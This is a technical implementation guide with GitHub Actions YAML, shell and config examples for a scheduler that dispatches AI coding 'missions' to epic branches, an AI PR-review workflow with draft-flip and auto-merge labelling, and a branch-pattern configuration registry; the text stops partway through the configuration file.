# Epic #181: GitHub Actions Implementation Guide

**Version:** 1.0
**Date:** 2025-09-23
**Status:** Implementation-Ready Technical Specifications
**Author:** DocumentationMaintainer
**Based on:** WorkflowEngineer Analysis (`epic-181-ai-orchestration-implementation-guide.md`)

## Executive Summary

This comprehensive GitHub Actions implementation guide provides exact technical specifications, YAML configurations, and deployment procedures for Epic #181's AI orchestration framework. Built upon proven foundation components from Issues #183, #212, #184, and #185, this guide enables implementation teams to deploy a universal CI/CD system with intelligent branch-aware AI integration.

**Critical Dependencies:** Issue #220 (Coverage Epic Merge Orchestrator) must be resolved before full framework deployment.

## 1. Default-Branch Dispatcher Implementation

### 1.1 Scheduler-Controller Architecture

The scheduler-controller serves as the orchestration brain, running on the main branch with cron triggers to discover and launch appropriate AI missions across epic branches.

#### 1.1.1 Complete YAML Implementation

```yaml
# .github/workflows/ai-orchestration-scheduler.yml
name: AI Orchestration Scheduler

on:
  schedule:
    # Run every 6 hours during active development periods
    - cron: '0 */6 * * *'
  workflow_dispatch:
    inputs:
      force_discovery:
        description: 'Force work discovery regardless of activity detection'
        required: false
        default: 'false'
        type: choice
        options: ['true', 'false']
      target_pattern:
        description: 'Target specific branch pattern (optional)'
        required: false
        default: ''
      dry_run:
        description: 'Preview actions without executing'
        required: false
        default: 'false'
        type: choice
        options: ['true', 'false']

permissions:
  contents: read
  actions: write
  pull-requests: write
  id-token: write

env:
  SCHEDULER_VERSION: "1.0"
  CONFIG_PATH: ".github/ai-orchestration-config.yml"

jobs:
  orchestration-discovery:
    name: AI Orchestration Discovery
    runs-on: ubuntu-latest
    timeout-minutes: 15
    outputs:
      eligible_branches: ${{ steps.branch-discovery.outputs.eligible_branches }}
      mission_matrix: ${{ steps.mission-planning.outputs.mission_matrix }}
      work_discovered: ${{ steps.work-discovery.outputs.work_discovered }}
      scheduler_status: ${{ steps.scheduler-health.outputs.status }}

    steps:
      - name: Checkout main branch for orchestration
        uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0

      - name: Load AI orchestration configuration
        id: config-loader
        run: |
          echo "üîß Loading AI orchestration configuration..."

          if [[ ! -f "$CONFIG_PATH" ]]; then
            echo "‚ùå Configuration file not found: $CONFIG_PATH"
            echo "config_loaded=false" >> $GITHUB_OUTPUT
            exit 1
          fi

          # Validate configuration syntax
          python3 -c "
          import yaml, sys
          try:
              with open('$CONFIG_PATH', 'r') as f:
                  config = yaml.safe_load(f)
              print('‚úÖ Configuration syntax valid')
              print(f'Found {len(config.get(\"ai_orchestration\", {}).get(\"branch_patterns\", {}))} branch patterns')
          except Exception as e:
              print(f'‚ùå Configuration syntax error: {e}')
              sys.exit(1)
          "

          echo "config_loaded=true" >> $GITHUB_OUTPUT
          echo "config_path=$CONFIG_PATH" >> $GITHUB_OUTPUT

      - name: Discover eligible epic branches
        id: branch-discovery
        if: steps.config-loader.outputs.config_loaded == 'true'
        run: |
          echo "üîç Discovering eligible epic branches..."

          # Get all remote branches with epic patterns
          git fetch origin --prune
          EPIC_BRANCHES=$(git branch -r | grep -E "origin/epic/" | sed 's/origin\///' | tr -d ' ')

          ELIGIBLE_BRANCHES="[]"
          BRANCH_COUNT=0

          if [[ -n "$EPIC_BRANCHES" ]]; then
            ELIGIBLE_JSON="["
            FIRST=true

            for branch in $EPIC_BRANCHES; do
              # Check if branch has recent activity (last 7 days) unless forced
              if [[ "${{ inputs.force_discovery }}" == "true" ]]; then
                RECENT_ACTIVITY=true
              else
                COMMITS_LAST_WEEK=$(git rev-list --count --since="7 days ago" origin/$branch)
                RECENT_ACTIVITY=$([[ $COMMITS_LAST_WEEK -gt 0 ]] && echo "true" || echo "false")
              fi

              if [[ "$RECENT_ACTIVITY" == "true" ]]; then
                if [[ "$FIRST" == "false" ]]; then
                  ELIGIBLE_JSON="$ELIGIBLE_JSON,"
                fi
                ELIGIBLE_JSON="$ELIGIBLE_JSON\"$branch\""
                FIRST=false
                ((BRANCH_COUNT++))
              fi
            done

            ELIGIBLE_JSON="$ELIGIBLE_JSON]"
            ELIGIBLE_BRANCHES="$ELIGIBLE_JSON"
          fi

          echo "eligible_branches=$ELIGIBLE_BRANCHES" >> $GITHUB_OUTPUT
          echo "branch_count=$BRANCH_COUNT" >> $GITHUB_OUTPUT
          echo "üìä Found $BRANCH_COUNT eligible epic branches"

      - name: Discover draft PRs for epic branches
        id: pr-discovery
        if: steps.branch-discovery.outputs.branch_count > 0
        run: |
          echo "üîç Discovering draft PRs for eligible branches..."

          ELIGIBLE_BRANCHES='${{ steps.branch-discovery.outputs.eligible_branches }}'
          PR_MATRIX="[]"

          if [[ "$ELIGIBLE_BRANCHES" != "[]" ]]; then
            PR_JSON="["
            FIRST=true

            # Use GitHub CLI to find draft PRs
            for branch in $(echo "$ELIGIBLE_BRANCHES" | jq -r '.[]'); do
              # Find most recent draft PR for this branch
              DRAFT_PR=$(gh pr list --base "$branch" --state open --draft --limit 1 --json number,headRefName,title | jq -r '.[0] // empty')

              if [[ -n "$DRAFT_PR" && "$DRAFT_PR" != "null" ]]; then
                PR_NUMBER=$(echo "$DRAFT_PR" | jq -r '.number')
                HEAD_BRANCH=$(echo "$DRAFT_PR" | jq -r '.headRefName')
                PR_TITLE=$(echo "$DRAFT_PR" | jq -r '.title')

                if [[ "$FIRST" == "false" ]]; then
                  PR_JSON="$PR_JSON,"
                fi

                PR_JSON="$PR_JSON{\"branch\":\"$branch\",\"pr_number\":$PR_NUMBER,\"head_branch\":\"$HEAD_BRANCH\",\"title\":\"$PR_TITLE\"}"
                FIRST=false
              fi
            done

            PR_JSON="$PR_JSON]"
            PR_MATRIX="$PR_JSON"
          fi

          echo "pr_matrix=$PR_MATRIX" >> $GITHUB_OUTPUT
          echo "üìã Draft PR discovery complete"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Execute work discovery for epic branches
        id: work-discovery
        if: steps.branch-discovery.outputs.branch_count > 0
        run: |
          echo "üîç Executing work discovery for epic branches..."

          # Load configuration and execute work discovery adapters
          ELIGIBLE_BRANCHES='${{ steps.branch-discovery.outputs.eligible_branches }}'
          WORK_AVAILABLE="[]"

          if [[ "$ELIGIBLE_BRANCHES" != "[]" ]]; then
            # For each eligible branch, check if work discovery is enabled
            python3 << 'EOF'
          import json
          import yaml
          import sys

          # Load configuration
          with open('${{ env.CONFIG_PATH }}', 'r') as f:
              config = yaml.safe_load(f)

          eligible_branches = json.loads('${{ steps.branch-discovery.outputs.eligible_branches }}')
          work_branches = []

          for branch in eligible_branches:
              # Match branch pattern to configuration
              branch_patterns = config.get('ai_orchestration', {}).get('branch_patterns', {})

              for pattern_name, pattern_config in branch_patterns.items():
                  import re
                  if re.match(pattern_config.get('pattern', ''), branch):
                      work_discovery = pattern_config.get('work_discovery', {})
                      if work_discovery.get('enabled', False):
                          work_branches.append(branch)
                      break

          print(json.dumps(work_branches))
          EOF

          WORK_AVAILABLE=$(python3 -c "
          import json
          import yaml
          import re

          with open('${{ env.CONFIG_PATH }}', 'r') as f:
              config = yaml.safe_load(f)

          eligible_branches = json.loads('${{ steps.branch-discovery.outputs.eligible_branches }}')
          work_branches = []

          for branch in eligible_branches:
              branch_patterns = config.get('ai_orchestration', {}).get('branch_patterns', {})

              for pattern_name, pattern_config in branch_patterns.items():
                  if re.match(pattern_config.get('pattern', ''), branch):
                      work_discovery = pattern_config.get('work_discovery', {})
                      if work_discovery.get('enabled', False):
                          work_branches.append(branch)
                      break

          print(json.dumps(work_branches))
          ")
          fi

          echo "work_discovered=$WORK_AVAILABLE" >> $GITHUB_OUTPUT
          echo "üîß Work discovery execution complete"

      - name: Generate mission planning matrix
        id: mission-planning
        if: steps.branch-discovery.outputs.branch_count > 0
        run: |
          echo "üìã Generating mission planning matrix..."

          ELIGIBLE_BRANCHES='${{ steps.branch-discovery.outputs.eligible_branches }}'
          PR_MATRIX='${{ steps.pr-discovery.outputs.pr_matrix }}'

          # Create mission matrix combining branch patterns with PR status
          MISSION_JSON="["
          FIRST=true

          for branch in $(echo "$ELIGIBLE_BRANCHES" | jq -r '.[]'); do
            # Check if branch has existing draft PR
            EXISTING_PR=$(echo "$PR_MATRIX" | jq -r --arg branch "$branch" '.[] | select(.branch == $branch) | .pr_number // empty')

            if [[ "$FIRST" == "false" ]]; then
              MISSION_JSON="$MISSION_JSON,"
            fi

            if [[ -n "$EXISTING_PR" && "$EXISTING_PR" != "null" ]]; then
              MISSION_JSON="$MISSION_JSON{\"branch\":\"$branch\",\"mode\":\"resume\",\"pr_number\":$EXISTING_PR}"
            else
              MISSION_JSON="$MISSION_JSON{\"branch\":\"$branch\",\"mode\":\"create\",\"pr_number\":null}"
            fi
            FIRST=false
          done

          MISSION_JSON="$MISSION_JSON]"
          echo "mission_matrix=$MISSION_JSON" >> $GITHUB_OUTPUT
          echo "üöÄ Mission planning matrix generated"

      - name: Scheduler health check
        id: scheduler-health
        if: always()
        run: |
          echo "üè• Performing scheduler health check..."

          BRANCH_COUNT=${{ steps.branch-discovery.outputs.branch_count || 0 }}
          CONFIG_LOADED=${{ steps.config-loader.outputs.config_loaded || 'false' }}

          if [[ "$CONFIG_LOADED" == "true" && "$BRANCH_COUNT" -ge 0 ]]; then
            echo "status=healthy" >> $GITHUB_OUTPUT
            echo "‚úÖ Scheduler health: HEALTHY"
          else
            echo "status=degraded" >> $GITHUB_OUTPUT
            echo "‚ö†Ô∏è Scheduler health: DEGRADED"
          fi

  # Dynamic job generation for AI missions
  ai-mission-dispatch:
    name: AI Mission Dispatch
    needs: [orchestration-discovery]
    if: |
      always() && !cancelled() &&
      needs.orchestration-discovery.outputs.scheduler_status == 'healthy' &&
      needs.orchestration-discovery.result == 'success'
    strategy:
      matrix:
        mission: ${{ fromJson(needs.orchestration-discovery.outputs.mission_matrix) }}
      fail-fast: false
      max-parallel: 2  # Limit concurrent missions to prevent resource conflicts
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout main branch for dispatch
        uses: actions/checkout@v4
        with:
          ref: main

      - name: Dispatch AI mission workflow
        run: |
          echo "üöÄ Dispatching AI mission for branch: ${{ matrix.mission.branch }}"
          echo "Mode: ${{ matrix.mission.mode }}"
          echo "PR Number: ${{ matrix.mission.pr_number || 'N/A' }}"

          # Determine mission workflow based on branch pattern
          MISSION_WORKFLOW="ai-mission-generic.yml"

          if [[ "${{ matrix.mission.branch }}" =~ ^epic/testing-coverage ]]; then
            MISSION_WORKFLOW="ai-mission-coverage.yml"
          elif [[ "${{ matrix.mission.branch }}" =~ ^epic/tech-debt ]]; then
            MISSION_WORKFLOW="ai-mission-tech-debt.yml"
          elif [[ "${{ matrix.mission.branch }}" =~ ^epic/performance ]]; then
            MISSION_WORKFLOW="ai-mission-performance.yml"
          fi

          # Dispatch mission workflow with appropriate parameters
          gh workflow run "$MISSION_WORKFLOW" \
            --field "target_branch=${{ matrix.mission.branch }}" \
            --field "mission_mode=${{ matrix.mission.mode }}" \
            --field "existing_pr_number=${{ matrix.mission.pr_number || '' }}" \
            --field "scheduled_trigger=true"

          echo "‚úÖ Mission dispatched: $MISSION_WORKFLOW for ${{ matrix.mission.branch }}"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

#### 1.1.2 GitHub CLI Integration Patterns

**Branch Discovery Logic:**
```bash
# Epic branch discovery with activity filtering
git branch -r | grep -E "origin/epic/" | sed 's/origin\///' | tr -d ' '

# Recent activity check (last 7 days)
COMMITS_LAST_WEEK=$(git rev-list --count --since="7 days ago" origin/$branch)
RECENT_ACTIVITY=$([[ $COMMITS_LAST_WEEK -gt 0 ]] && echo "true" || echo "false")
```

**Draft PR Discovery:**
```bash
# Find latest draft PR for each epic branch
gh pr list --base "$branch" --state open --draft --limit 1 --json number,headRefName,title
```

**Mission Matrix Generation:**
```json
[
  {"branch": "epic/testing-coverage-to-90", "mode": "resume", "pr_number": 123},
  {"branch": "epic/tech-debt-automation", "mode": "create", "pr_number": null}
]
```

#### 1.1.3 Cron Trigger Strategy

**Schedule Configuration:**
```yaml
schedule:
  # Primary: Every 6 hours during active development
  - cron: '0 */6 * * *'
  # Alternative: Business hours only (9 AM, 1 PM, 5 PM EST)
  # - cron: '0 14,18,22 * * 1-5'
```

**Health Monitoring:**
- Scheduler status tracking via workflow outputs
- Configuration validation on every run
- Branch discovery metrics and alerting
- Mission dispatch success tracking

## 2. Mission Workflow Templates

### 2.1 Universal Mission Template Structure

#### 2.1.1 Coverage Mission Implementation

```yaml
# .github/workflows/ai-mission-coverage.yml
name: AI Mission - Coverage Builder

on:
  workflow_dispatch:
    inputs:
      target_branch:
        description: 'Epic branch to target for coverage work'
        required: true
        default: 'epic/testing-coverage-to-90'
      mission_mode:
        description: 'Mission execution mode'
        required: true
        default: 'create'
        type: choice
        options: ['create', 'resume']
      existing_pr_number:
        description: 'Existing PR number to resume (if applicable)'
        required: false
        default: ''
      scheduled_trigger:
        description: 'Triggered by scheduler (affects failure handling)'
        required: false
        default: 'false'
        type: choice
        options: ['true', 'false']

permissions:
  contents: write
  pull-requests: write
  id-token: write

concurrency:
  group: ai-mission-coverage-${{ inputs.target_branch }}
  cancel-in-progress: false  # Allow scheduled missions to complete

env:
  TARGET_BRANCH: ${{ inputs.target_branch }}
  MISSION_MODE: ${{ inputs.mission_mode }}
  SCHEDULED_TRIGGER: ${{ inputs.scheduled_trigger }}
  CONTINUE_ON_ERROR: ${{ inputs.scheduled_trigger == 'true' }}

jobs:
  ai-coverage-mission:
    name: Coverage Analysis & AI Development
    runs-on: ubuntu-latest
    timeout-minutes: 45

    steps:
      - name: Checkout target epic branch
        uses: actions/checkout@v4
        with:
          ref: ${{ env.TARGET_BRANCH }}
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}

      # Universal Foundation Pipeline (Always Execute)
      - name: Foundation - Environment Setup
        id: environment-setup
        uses: ./.github/actions/shared/setup-environment
        with:
          dotnet_version: '8.0'
          restore_tools: true
        # Note: Environment setup failures terminate mission regardless of mode

      - name: Foundation - Dependency Resolution
        id: dependency-resolution
        continue-on-error: ${{ env.CONTINUE_ON_ERROR == 'true' }}
        uses: ./.github/actions/shared/backend-build
        with:
          solution_path: 'zarichney-api.sln'
          step_type: 'restore'
          cache_enabled: true

      - name: Foundation - Build Execution
        id: build-execution
        continue-on-error: ${{ env.CONTINUE_ON_ERROR == 'true' }}
        uses: ./.github/actions/shared/backend-build
        with:
          solution_path: 'zarichney-api.sln'
          step_type: 'build'
          configuration: 'Release'
          warning_as_error: false  # Missions can work with warnings

      - name: Foundation - Test Execution
        id: test-execution
        continue-on-error: ${{ env.CONTINUE_ON_ERROR == 'true' }}
        uses: ./.github/actions/shared/backend-build
        with:
          solution_path: 'zarichney-api.sln'
          step_type: 'test'
          coverage_enabled: true
          test_filter: 'Category=Unit|Category=Integration'

      # Mission-Specific Diagnostics Collection
      - name: Collect diagnostic context for AI
        id: diagnostics-collection
        if: always()
        run: |
          echo "üîç Collecting diagnostic context for AI agent..."

          # Capture build/test status for AI context
          BUILD_SUCCESS="${{ steps.build-execution.outputs.build_success || 'false' }}"
          TEST_SUCCESS="${{ steps.test-execution.outputs.test_success || 'false' }}"
          COVERAGE_PERCENTAGE="${{ steps.test-execution.outputs.coverage_percentage || '0' }}"

          # Create diagnostic summary
          cat > diagnostic_context.json << EOF
          {
            "mission_type": "coverage_builder",
            "target_branch": "$TARGET_BRANCH",
            "foundation_status": {
              "build_success": "$BUILD_SUCCESS",
              "test_success": "$TEST_SUCCESS",
              "coverage_percentage": "$COVERAGE_PERCENTAGE"
            },
            "mission_context": {
              "mode": "$MISSION_MODE",
              "scheduled": "$SCHEDULED_TRIGGER",
              "existing_pr": "${{ inputs.existing_pr_number }}"
            },
            "failure_logs": {
              "build_errors": "${{ steps.build-execution.outputs.error_summary || 'None' }}",
              "test_failures": "${{ steps.test-execution.outputs.failed_tests || 'None' }}"
            }
          }
          EOF

          echo "diagnostics_ready=true" >> $GITHUB_OUTPUT
          echo "üìä Diagnostic context prepared for AI agent"

      # AI Coverage Builder Execution
      - name: Execute AI Coverage Builder
        id: ai-coverage-builder
        if: steps.diagnostics-collection.outputs.diagnostics_ready == 'true'
        uses: ./.github/actions/shared/ai-testing-analysis
        with:
          mission_mode: 'coverage_builder'
          diagnostic_context: 'diagnostic_context.json'
          coverage_baseline: ${{ steps.test-execution.outputs.coverage_percentage || '16' }}
          target_coverage: '90'
          epic_context: 'Epic #181 autonomous development - Coverage to 90%'
          existing_pr_number: ${{ inputs.existing_pr_number }}
          github_token: ${{ secrets.GITHUB_TOKEN }}
          openai_api_key: ${{ secrets.OPENAI_API_KEY }}
          debug_mode: 'true'

      # Mission Artifact Storage
      - name: Store mission artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ai-mission-artifacts-${{ github.run_number }}
          path: |
            diagnostic_context.json
            TestResults/
            CoverageReport/
            mission_output/
          retention-days: 14

      # Mission Status Reporting
      - name: Report mission status
        if: always()
        run: |
          echo "üìä AI Coverage Mission Status Report"
          echo "Target Branch: $TARGET_BRANCH"
          echo "Mission Mode: $MISSION_MODE"
          echo "Scheduled Trigger: $SCHEDULED_TRIGGER"
          echo "Build Success: ${{ steps.build-execution.outputs.build_success || 'false' }}"
          echo "Test Success: ${{ steps.test-execution.outputs.test_success || 'false' }}"
          echo "AI Execution: ${{ steps.ai-coverage-builder.outputs.execution_status || 'unknown' }}"

          # For scheduled triggers, mission success means orchestration worked
          # Build/test failures are context for AI, not mission failures
          if [[ "$SCHEDULED_TRIGGER" == "true" ]]; then
            echo "‚úÖ Scheduled mission completed - AI agent received diagnostic context"
            exit 0
          else
            # Manual triggers require successful foundation for meaningful AI work
            if [[ "${{ steps.build-execution.outputs.build_success }}" == "true" ]]; then
              echo "‚úÖ Manual mission completed successfully"
              exit 0
            else
              echo "‚ùå Manual mission failed - foundation issues prevent AI work"
              exit 1
            fi
          fi
```

#### 2.1.2 Non-Blocking Philosophy Implementation

**Continue-on-Error Semantics:**
```yaml
continue-on-error: ${{ env.CONTINUE_ON_ERROR == 'true' }}
```

**Diagnostic Context Collection:**
```json
{
  "mission_type": "coverage_builder",
  "target_branch": "epic/testing-coverage-to-90",
  "foundation_status": {
    "build_success": "false",
    "test_success": "false",
    "coverage_percentage": "16.2"
  },
  "failure_logs": {
    "build_errors": "CS1234: Type not found...",
    "test_failures": "TestMethod1 failed: Assert.Equal..."
  }
}
```

**Mission Success Logic:**
- **Scheduled Missions:** Success = AI agent received context (regardless of build failures)
- **Manual Missions:** Success = Foundation pipeline works + AI execution completes

### 2.2 Mission-Specific Templates

#### 2.2.1 Tech Debt Mission Template

```yaml
# .github/workflows/ai-mission-tech-debt.yml
name: AI Mission - Tech Debt Resolver

on:
  workflow_dispatch:
    inputs:
      target_branch:
        description: 'Epic branch to target for tech debt work'
        required: true
        default: 'epic/tech-debt-automation'
      # ... same input structure as coverage mission

jobs:
  ai-tech-debt-mission:
    name: Tech Debt Analysis & Resolution
    runs-on: ubuntu-latest
    timeout-minutes: 45

    steps:
      # ... same foundation pipeline as coverage mission

      - name: Execute AI Tech Debt Resolver
        id: ai-tech-debt-resolver
        if: steps.diagnostics-collection.outputs.diagnostics_ready == 'true'
        uses: ./.github/actions/shared/ai-standards-analysis
        with:
          mission_mode: 'tech_debt_resolver'
          diagnostic_context: 'diagnostic_context.json'
          debt_baseline: ${{ steps.static-analysis.outputs.debt_score || '0' }}
          target_score: 'B'
          epic_context: 'Epic #181 autonomous development - Tech Debt Reduction'
          existing_pr_number: ${{ inputs.existing_pr_number }}
          github_token: ${{ secrets.GITHUB_TOKEN }}
          openai_api_key: ${{ secrets.OPENAI_API_KEY }}
          debug_mode: 'true'
```

#### 2.2.2 Performance Mission Template

```yaml
# .github/workflows/ai-mission-performance.yml
name: AI Mission - Performance Optimizer

on:
  workflow_dispatch:
    inputs:
      target_branch:
        description: 'Epic branch to target for performance work'
        required: true
        default: 'epic/performance-optimization'
      # ... same input structure

jobs:
  ai-performance-mission:
    name: Performance Analysis & Optimization
    runs-on: ubuntu-latest
    timeout-minutes: 60  # Performance analysis may take longer

    steps:
      # ... same foundation pipeline

      - name: Execute performance benchmarks
        id: performance-benchmarks
        continue-on-error: ${{ env.CONTINUE_ON_ERROR == 'true' }}
        run: |
          echo "üöÄ Running performance benchmarks..."
          dotnet run --project Code/Zarichney.Server.Benchmarks --configuration Release

      - name: Execute AI Performance Optimizer
        id: ai-performance-optimizer
        if: steps.diagnostics-collection.outputs.diagnostics_ready == 'true'
        uses: ./.github/actions/shared/ai-performance-analysis
        with:
          mission_mode: 'performance_optimizer'
          diagnostic_context: 'diagnostic_context.json'
          benchmark_results: ${{ steps.performance-benchmarks.outputs.results_path }}
          target_improvement: '20%'
          epic_context: 'Epic #181 autonomous development - Performance Optimization'
          existing_pr_number: ${{ inputs.existing_pr_number }}
          github_token: ${{ secrets.GITHUB_TOKEN }}
          openai_api_key: ${{ secrets.OPENAI_API_KEY }}
          debug_mode: 'true'
```

### 2.3 Artifact Publishing Patterns

**Standard Artifact Structure:**
```yaml
- name: Store mission artifacts
  if: always()
  uses: actions/upload-artifact@v4
  with:
    name: ai-mission-artifacts-${{ github.run_number }}
    path: |
      diagnostic_context.json
      TestResults/
      CoverageReport/
      mission_output/
      ai_analysis/
      performance_reports/
    retention-days: 14
```

**Cross-Mission Artifact Sharing:**
```yaml
- name: Download previous mission artifacts
  if: inputs.mission_mode == 'resume'
  uses: actions/download-artifact@v4
  with:
    name: ai-mission-artifacts-${{ inputs.previous_run_number }}
    path: previous_mission/
```

## 3. Review Workflow Specifications

### 3.1 PR-Triggered Review Implementation

```yaml
# .github/workflows/ai-review-epic.yml
name: AI Review - Epic Branch

on:
  pull_request:
    types: [opened, synchronize, ready_for_review]
    branches:
      - 'epic/**'
  pull_request_review:
    types: [submitted]

permissions:
  contents: read
  pull-requests: write
  id-token: write

concurrency:
  group: ai-review-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  foundation-validation:
    name: Foundation Validation & Quality Gates
    runs-on: ubuntu-latest
    timeout-minutes: 20
    outputs:
      foundation_success: ${{ steps.validation-summary.outputs.foundation_success }}
      build_success: ${{ steps.foundation-build.outputs.build_success }}
      test_success: ${{ steps.foundation-build.outputs.test_success }}
      coverage_percentage: ${{ steps.foundation-build.outputs.coverage_percentage }}
      ai_review_ready: ${{ steps.validation-summary.outputs.ai_review_ready }}

    steps:
      - name: Checkout PR branch
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # Foundation pipeline - BLOCKING for review mode
      - name: Foundation Build & Test Validation
        id: foundation-build
        uses: ./.github/actions/shared/backend-build
        with:
          solution_path: 'zarichney-api.sln'
          coverage_enabled: true
          warning_as_error: true
          configuration: 'Release'
        # Note: No continue-on-error - failures block AI review

      - name: Foundation validation summary
        id: validation-summary
        run: |
          BUILD_SUCCESS="${{ steps.foundation-build.outputs.build_success }}"
          TEST_SUCCESS="${{ steps.foundation-build.outputs.test_success }}"

          if [[ "$BUILD_SUCCESS" == "true" && "$TEST_SUCCESS" == "true" ]]; then
            echo "foundation_success=true" >> $GITHUB_OUTPUT
            echo "ai_review_ready=true" >> $GITHUB_OUTPUT
            echo "‚úÖ Foundation validation passed - AI review ready"
          else
            echo "foundation_success=false" >> $GITHUB_OUTPUT
            echo "ai_review_ready=false" >> $GITHUB_OUTPUT
            echo "‚ùå Foundation validation failed - blocking AI review"
          fi

      # Mark PR as draft if foundation fails
      - name: Mark PR as draft on foundation failure
        if: steps.validation-summary.outputs.foundation_success == 'false'
        uses: actions/github-script@v7
        with:
          script: |
            if (!context.payload.pull_request.draft) {
              await github.rest.pulls.update({
                owner: context.repo.owner,
                repo: context.repo.repo,
                pull_number: context.issue.number,
                draft: true
              });

              await github.rest.issues.createComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.issue.number,
                body: `## ‚ùå Foundation Validation Failed

                This PR has been marked as draft due to foundation validation failures:

                - **Build Success:** ${{ steps.foundation-build.outputs.build_success }}
                - **Test Success:** ${{ steps.foundation-build.outputs.test_success }}

                AI review will be skipped until foundation issues are resolved.

                ### Next Steps
                1. Fix build/test issues
                2. Push updated code
                3. Mark PR as ready for review to trigger AI analysis

                *Automated by AI Review System*`
              });
            }

  ai-iterative-review:
    name: AI Iterative Code Review
    needs: [foundation-validation]
    if: |
      always() && !cancelled() &&
      needs.foundation-validation.outputs.ai_review_ready == 'true' &&
      !github.event.pull_request.draft
    runs-on: ubuntu-latest
    timeout-minutes: 25

    outputs:
      review_status: ${{ steps.iterative-review.outputs.pr_status }}
      iteration_count: ${{ steps.iterative-review.outputs.iteration_count }}
      quality_gates_status: ${{ steps.iterative-review.outputs.quality_gates }}
      blocking_issues: ${{ steps.iterative-review.outputs.blocking_issues }}

    steps:
      - name: Checkout PR branch
        uses: actions/checkout@v4

      - name: Execute iterative AI review
        id: iterative-review
        uses: ./.github/actions/iterative-ai-review
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          openai_api_key: ${{ secrets.OPENAI_API_KEY }}
          pr_number: ${{ github.event.pull_request.number }}
          iteration_trigger: 'pr_review'
          max_iterations: '5'
          quality_threshold: 'epic'
          epic_context: 'Epic branch autonomous development'
          debug_mode: 'false'

  review-quality-gates:
    name: Review Quality Gate Enforcement
    needs: [foundation-validation, ai-iterative-review]
    if: always() && !cancelled()
    runs-on: ubuntu-latest
    timeout-minutes: 5

    steps:
      - name: Evaluate quality gates
        run: |
          FOUNDATION_SUCCESS="${{ needs.foundation-validation.outputs.foundation_success }}"
          REVIEW_STATUS="${{ needs.ai-iterative-review.outputs.review_status }}"
          BLOCKING_ISSUES="${{ needs.ai-iterative-review.outputs.blocking_issues }}"

          echo "üìä Quality Gate Evaluation"
          echo "Foundation Success: $FOUNDATION_SUCCESS"
          echo "Review Status: $REVIEW_STATUS"
          echo "Blocking Issues: $BLOCKING_ISSUES"

          # Determine overall PR status
          if [[ "$FOUNDATION_SUCCESS" == "true" && "$REVIEW_STATUS" == "ready" ]]; then
            echo "‚úÖ All quality gates passed - PR ready for merge"
            echo "PR_READY=true" >> $GITHUB_ENV
          else
            echo "‚è≥ Quality gates pending - PR remains in review"
            echo "PR_READY=false" >> $GITHUB_ENV
          fi

      - name: Update PR status based on quality gates
        uses: actions/github-script@v7
        with:
          script: |
            const prReady = process.env.PR_READY === 'true';
            const reviewStatus = '${{ needs.ai-iterative-review.outputs.review_status }}';

            if (prReady) {
              // Add ready-for-merge label
              await github.rest.issues.addLabels({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.issue.number,
                labels: ['ai-review:approved', 'ready-for-merge']
              });
            } else {
              // Ensure ready-for-merge label is removed
              try {
                await github.rest.issues.removeLabel({
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  issue_number: context.issue.number,
                  name: 'ready-for-merge'
                });
              } catch (e) {
                // Label might not exist, ignore error
              }
            }
```

### 3.2 Draft Flip Mechanism

**Automatic Draft Conversion Logic:**
```javascript
// Mark PR as draft on foundation failure
if (!context.payload.pull_request.draft) {
  await github.rest.pulls.update({
    owner: context.repo.owner,
    repo: context.repo.repo,
    pull_number: context.issue.number,
    draft: true
  });
}
```

**Explanatory Comment:**
```markdown
## ‚ùå Foundation Validation Failed

This PR has been marked as draft due to foundation validation failures:

- **Build Success:** false
- **Test Success:** false

AI review will be skipped until foundation issues are resolved.

### Next Steps
1. Fix build/test issues
2. Push updated code
3. Mark PR as ready for review to trigger AI analysis

*Automated by AI Review System*
```

### 3.3 Auto-Merge Logic

**Checklist Validation:**
```javascript
const prReady = process.env.PR_READY === 'true';
const reviewStatus = '${{ needs.ai-iterative-review.outputs.review_status }}';

if (prReady) {
  // Add ready-for-merge label
  await github.rest.issues.addLabels({
    owner: context.repo.owner,
    repo: context.repo.repo,
    issue_number: context.issue.number,
    labels: ['ai-review:approved', 'ready-for-merge']
  });
}
```

**Auto-Merge Conditions:**
1. Foundation validation passes
2. AI review status = "ready"
3. No blocking issues identified
4. All required checks pass
5. Branch protection rules satisfied

## 4. AI Configuration Registry Implementation

### 4.1 Configuration File Structure

```yaml
# .github/ai-orchestration-config.yml
ai_orchestration:
  version: "1.0"
  default_behavior: "generic-review"

  # Branch pattern matching with priority
  branch_patterns:
    main:
      pattern: "^main$"
      priority: 100
      ai_behavior: "5-sentinel-suite"
      configuration:
        sentinels: ["debt", "standards", "testing", "security", "merge"]
        timeout_minutes: 30
        cost_limit: "unlimited"
      quality_gates: "production"

    develop:
      pattern: "^develop$"
      priority: 90
      ai_behavior: "4-sentinel-suite"
      configuration:
        sentinels: ["debt", "standards", "testing", "merge"]
        timeout_minutes: 25
        cost_limit: "high"
      quality_gates: "staging"

    coverage_epic:
      pattern: "^epic/testing-coverage-.*"
      priority: 80
      ai_behavior: "iterative-autonomous"
      configuration:
        ai_prompt: "coverage-builder"
        ai_review: "iterative-code-review"
        max_iterations: 5
        auto_merge: true
        scheduler:
          enabled: true
          interval: "6h"
          conditions: ["no_pending_prs", "build_healthy"]
      work_discovery:
        enabled: true
        source: "coverage_reports"
        configuration:
          baseline_threshold: 16
          target_threshold: 90

    tech_debt_epic:
      pattern: "^epic/tech-debt-.*"
      priority: 75
      ai_behavior: "iterative-autonomous"
      configuration:
        ai_prompt: "tech-debt-resolver"
        ai_review: "iterative-code-review"
        max_iterations: 3
        auto_merge: true
        scheduler:
          enabled: true
          interval: "12h"
          conditions: ["no_pending_prs", "debt_score_above_threshold"]
      work_discovery:
        enabled: true
        source: "static_analysis"
        configuration:
          debt_threshold: "C"
          target_score: "B"

    performance_epic:
      pattern: "^epic/performance-.*"
      priority: 75
      ai_behavior: "iterative-autonomous"
      configuration:
